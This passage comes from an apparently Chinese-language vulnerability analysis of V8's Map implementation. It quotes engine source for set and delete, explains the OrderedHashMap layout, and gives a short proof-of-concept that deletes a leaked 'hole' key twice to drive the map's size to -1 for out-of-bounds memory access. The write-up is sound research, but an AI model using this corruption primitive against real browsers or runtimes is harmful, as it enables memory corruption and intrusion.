</span></span><span style="display:flex;"><span>           <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">add_entry</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Otherwise, go to runtime to compute the hash code.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">entry_start_position_or_hash</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiUntag</span>(<span style="color:#a6e22e">CallGetOrCreateHashRaw</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">key</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Goto</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">add_entry</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">BIND</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">add_entry</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">TVARIABLE</span>(<span style="color:#a6e22e">IntPtrT</span>, <span style="color:#a6e22e">number_of_buckets</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">TVARIABLE</span>(<span style="color:#a6e22e">IntPtrT</span>, <span style="color:#a6e22e">occupancy</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">TVARIABLE</span>(<span style="color:#a6e22e">OrderedHashMap</span>, <span style="color:#a6e22e">table_var</span>, <span style="color:#a6e22e">table</span>);
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 从 orderedhashmap 中取出哈希桶的总数,已经使用的数量
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Check we have enough space for the entry.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">number_of_buckets</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiUntag</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">UnsafeLoadFixedArrayElement</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfBucketsIndex</span>())));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">STATIC_ASSERT</span>(<span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kLoadFactor</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">WordT</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">capacity</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">WordShl</span>(<span style="color:#a6e22e">number_of_buckets</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IntPtrT</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">number_of_elements</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiUntag</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">LoadObjectField</span>(<span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfElementsOffset</span>())));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IntPtrT</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">number_of_deleted</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiUntag</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">LoadObjectField</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfDeletedElementsOffset</span>())));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">occupancy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IntPtrAdd</span>(<span style="color:#a6e22e">number_of_elements</span>, <span style="color:#a6e22e">number_of_deleted</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">GotoIf</span>(<span style="color:#a6e22e">IntPtrLessThan</span>(<span style="color:#a6e22e">occupancy</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#a6e22e">capacity</span>), <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">store_new_entry</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 哈希桶不够用了, 先增长哈希桶
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// We do not have enough space, grow the table and reload the relevant
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// fields.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">CallRuntime</span>(<span style="color:#a6e22e">Runtime</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapGrow</span>, <span style="color:#a6e22e">context</span>, <span style="color:#a6e22e">receiver</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">table_var</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">LoadObjectField</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">receiver</span>), <span style="color:#a6e22e">JSMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kTableOffset</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">number_of_buckets</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiUntag</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">UnsafeLoadFixedArrayElement</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">table_var</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfBucketsIndex</span>())));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IntPtrT</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">new_number_of_elements</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiUntag</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">LoadObjectField</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">table_var</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfElementsOffset</span>())));
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">IntPtrT</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">new_number_of_deleted</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiUntag</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">LoadObjectField</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">table_var</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfDeletedElementsOffset</span>())));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">occupancy</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">IntPtrAdd</span>(<span style="color:#a6e22e">new_number_of_elements</span>, <span style="color:#a6e22e">new_number_of_deleted</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">Goto</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">store_new_entry</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">BIND</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">store_new_entry</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// 哈希桶够用，或者已经补充，插入新数据
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// Store the key, value and connect the element to the bucket chain.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">StoreOrderedHashMapNewEntry</span>(<span style="color:#a6e22e">table_var</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#a6e22e">key</span>, <span style="color:#a6e22e">value</span>,
</span></span><span style="display:flex;"><span>                              <span style="color:#a6e22e">entry_start_position_or_hash</span>.<span style="color:#a6e22e">value</span>(),
</span></span><span style="display:flex;"><span>                              <span style="color:#a6e22e">number_of_buckets</span>.<span style="color:#a6e22e">value</span>(), <span style="color:#a6e22e">occupancy</span>.<span style="color:#a6e22e">value</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Return</span>(<span style="color:#a6e22e">receiver</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ordered-hash-table.h
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// OrderedHashTable is a HashTable with Object keys that preserves
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// insertion order. There are Map and Set interfaces (OrderedHashMap
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// and OrderedHashTable, below). It is meant to be used by JSMap/JSSet.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Only Object keys are supported, with Object::SameValueZero() used as the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// equality operator and Object::GetHash() for the hash function.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Based on the &#34;Deterministic Hash Table&#34; as described by Jason Orendorff at
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// https://wiki.mozilla.org/User:Jorend/Deterministic_hash_tables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Originally attributed to Tyler Close.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Memory layout:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [0] : Prefix
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize]: element count
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 1]: deleted element count
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 2]: bucket count
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 3..(kPrefixSize + 3 + NumberOfBuckets() - 1)]: &#34;hash table&#34;,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            where each item is an offset into the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            data table (see below) where the first
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            item in this bucket is stored.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 3 + NumberOfBuckets()..length]: &#34;data table&#34;, an
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            array of length Capacity() * kEntrySize,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            where the first entrysize items are
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            handled by the derived class and the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            item at kChainOffset is another entry
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            into the data table indicating the next
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                            entry in this hash bucket.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// When we transition the table to a new version we obsolete it and reuse parts
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// of the memory to store information how to transition an iterator to the new
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// table:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Memory layout for obsolete table:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [0] : Prefix
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 0]: Next newer table
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 1]: deleted element count or kClearedTableSentinel if
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                      the table was cleared
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 2]: bucket count
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 3..(kPrefixSize + 3 + NumberOfDeletedElements() - 1)]:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                      The indexes of the removed holes. This part is only
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                      usable for non-cleared tables, as clearing removes the
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//                      deleted elements count.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//   [kPrefixSize + 3 + NumberOfDeletedElements()..length]: Not used
</span></span></span></code></pre></div><p>简单看过之后可以了解到：</p>
<ul>
<li>Map 内部实际存储元素的是 <code>OrderedHashMap</code></li>
<li><code>OrderedHashMap</code> 是基于 <code>FixedArray</code> 数组实现的</li>
<li>数组的前几个元素存储了 Hash 表的元数据，例如元素的数量， Hash 桶的总数，已经删除的元素的数量</li>
</ul>
<p>再看下 <code>delete</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">TF_BUILTIN</span>(<span style="color:#a6e22e">MapPrototypeDelete</span>, <span style="color:#a6e22e">CollectionsBuiltinsAssembler</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">receiver</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Parameter</span><span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">Descriptor</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kReceiver</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">key</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Parameter</span><span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">Descriptor</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kKey</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">auto</span> <span style="color:#a6e22e">context</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Parameter</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Context</span><span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">Descriptor</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kContext</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ThrowIfNotInstanceType</span>(<span style="color:#a6e22e">context</span>, <span style="color:#a6e22e">receiver</span>, <span style="color:#a6e22e">JS_MAP_TYPE</span>,
</span></span><span style="display:flex;"><span>                         <span style="color:#e6db74">&#34;Map.prototype.delete&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">table</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">LoadObjectField</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">&gt;</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">receiver</span>), <span style="color:#a6e22e">JSMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kTableOffset</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">TVARIABLE</span>(<span style="color:#a6e22e">IntPtrT</span>, <span style="color:#a6e22e">entry_start_position_or_hash</span>, <span style="color:#a6e22e">IntPtrConstant</span>(<span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Label</span> <span style="color:#a6e22e">entry_found</span>(<span style="color:#66d9ef">this</span>), <span style="color:#a6e22e">not_found</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">TryLookupOrderedHashTableIndex</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">&gt;</span>(
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">key</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry_start_position_or_hash</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry_found</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">not_found</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">BIND</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">not_found</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Return</span>(<span style="color:#a6e22e">FalseConstant</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">BIND</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">entry_found</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// If we found the entry, mark the entry as deleted.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">StoreFixedArrayElement</span>(<span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">entry_start_position_or_hash</span>.<span style="color:#a6e22e">value</span>(),
</span></span><span style="display:flex;"><span>                         <span style="color:#a6e22e">TheHoleConstant</span>(), <span style="color:#a6e22e">UPDATE_WRITE_BARRIER</span>,
</span></span><span style="display:flex;"><span>                         <span style="color:#a6e22e">kTaggedSize</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">HashTableStartIndex</span>());
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">StoreFixedArrayElement</span>(<span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">entry_start_position_or_hash</span>.<span style="color:#a6e22e">value</span>(),
</span></span><span style="display:flex;"><span>                         <span style="color:#a6e22e">TheHoleConstant</span>(), <span style="color:#a6e22e">UPDATE_WRITE_BARRIER</span>,
</span></span><span style="display:flex;"><span>                         <span style="color:#a6e22e">kTaggedSize</span> <span style="color:#f92672">*</span> (<span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">HashTableStartIndex</span>() <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>                                        <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kValueOffset</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Decrement the number of elements, increment the number of deleted elements.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Smi</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">number_of_elements</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">SmiSub</span>(
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">LoadObjectField</span>(<span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfElementsOffset</span>())),
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">SmiConstant</span>(<span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">StoreObjectFieldNoWriteBarrier</span>(
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfElementsOffset</span>(), <span style="color:#a6e22e">number_of_elements</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Smi</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">number_of_deleted</span> <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">SmiAdd</span>(<span style="color:#a6e22e">CAST</span>(<span style="color:#a6e22e">LoadObjectField</span>(
</span></span><span style="display:flex;"><span>                 <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfDeletedElementsOffset</span>())),
</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">SmiConstant</span>(<span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">StoreObjectFieldNoWriteBarrier</span>(
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfDeletedElementsOffset</span>(),
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">number_of_deleted</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">TNode</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">Smi</span><span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">number_of_buckets</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">CAST</span>(
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">LoadFixedArrayElement</span>(<span style="color:#a6e22e">table</span>, <span style="color:#a6e22e">OrderedHashMap</span><span style="color:#f92672">::</span><span style="color:#a6e22e">NumberOfBucketsIndex</span>()));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// If there fewer elements than #buckets / 2, shrink the table.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">Label</span> <span style="color:#a6e22e">shrink</span>(<span style="color:#66d9ef">this</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GotoIf</span>(<span style="color:#a6e22e">SmiLessThan</span>(<span style="color:#a6e22e">SmiAdd</span>(<span style="color:#a6e22e">number_of_elements</span>, <span style="color:#a6e22e">number_of_elements</span>),
</span></span><span style="display:flex;"><span>                     <span style="color:#a6e22e">number_of_buckets</span>),
</span></span><span style="display:flex;"><span>         <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">shrink</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Return</span>(<span style="color:#a6e22e">TrueConstant</span>());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">BIND</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">shrink</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">CallRuntime</span>(<span style="color:#a6e22e">Runtime</span><span style="color:#f92672">::</span><span style="color:#a6e22e">kMapShrink</span>, <span style="color:#a6e22e">context</span>, <span style="color:#a6e22e">receiver</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">Return</span>(<span style="color:#a6e22e">TrueConstant</span>());
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>可以看到，删除一个已有元素，是在它原有的位置存入 <code>hole</code>，并减少元素计数，删除多个元素后，还会对 hash 桶进行缩减。但是由于我们之前已经利用漏洞得到了 <code>hole</code> 对象，如果指定目标对象为 <code>hole</code> 的话，每次搜到的都是同一个元素，这样我们就可以多次减少元素的计数，这样就可以让 <code>Map</code> 达到分析报告里提到的元素计数为 -1 的可以越界读写的状态。</p>
<p>在调试器里实际验证, 先在 POC 中加一些调试日志</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">map</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Map</span>();  
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">DebugPrint</span>(<span style="color:#a6e22e">map</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">set</span>(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">hole</span>, <span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Due to special handling of hole values, this ends up setting the size of the map to -1  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">map</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#a6e22e">hole</span>);  
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#a6e22e">hole</span>);  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">map</span>.<span style="color:#66d9ef">delete</span>(<span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Size is now -1  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//print(map.size);  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Set values in the map, which presumably ends up corrupting data in front of  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// the map storage due to the size being -1  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">100</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">map</span>.<span style="color:#a6e22e">set</span>(<span style="color:#a6e22e">i</span>, <span style="color:#ae81ff">1</span>);  
</span></span><span style="display:flex;"><span>}  
</span></span><span style="display:flex;"><span><span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Optionally trigger heap verification if the above didn&#39;t already crash  
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//gc();
</span></span></span></code></pre></div><p>map 对象刚创建好时内存数据如下：</p>
<p>JSMap:
header: JSObject
map: TaggedPtr
properties: TaggedPtr
Elements: TaggedPtr
table: TaggedPtr</p>
<p>![[Pasted image 20230821215221.png]]</p>
<p>这个时候 OrderedHashMap 是一个可以存储 2 个元素的空表。</p>
<p>OrderedHashMap:
map: TaggedPtr
length: Smi
element-count: Smi
deleted-element-count: Smi
bucket-count: Smi
hash buckets TaggedPtr[element-count]
hash data: TaggedPtr[element-count * 3]</p>
<p>![[Pasted image 20230821215415.png]]</p>
<p>图中从上到下的框框依次是：</p>
<ul>
<li>FixedArray 的元数据，map 和 length</li>
<li>OrderedHashMap 的元数据，元素数量，已删除元素数量，桶的数量</li>
<li>哈希桶，一共两个，桶里存放的不是数据本身， 而是数据在数据区的索引 (Smi)，现在没有任何元素，所以存放了两个特殊值 kNotFound(-1)</li>
<li>数据区域，实际存放数据的地方，每个元素存储 key, value, next-index 3 个值，next-index 是用来在有哈希碰撞的时候，保存下一个哈希相同的元素的索引</li>
</ul>
<p>添加了 <code>1</code> 和 <code>hole</code> 两个元素后</p>
<p>![[Pasted image 20230821215551.png]]</p>
<p>0x00002461 就是 <code>hole</code></p>
<p>连续两次删除 <code>hole</code> 之后，注意这里触发了 MapShrink 所以 OrderedHashTable 的地址也变化了</p>
<p>![[Pasted image 20230821220604.png]]</p>
<p>删除 <code>1</code> 之后</p>
<p>![[Pasted image 20230821220921.png]]</p>
<p>可以看到 element-count 已经溢出了。</p>
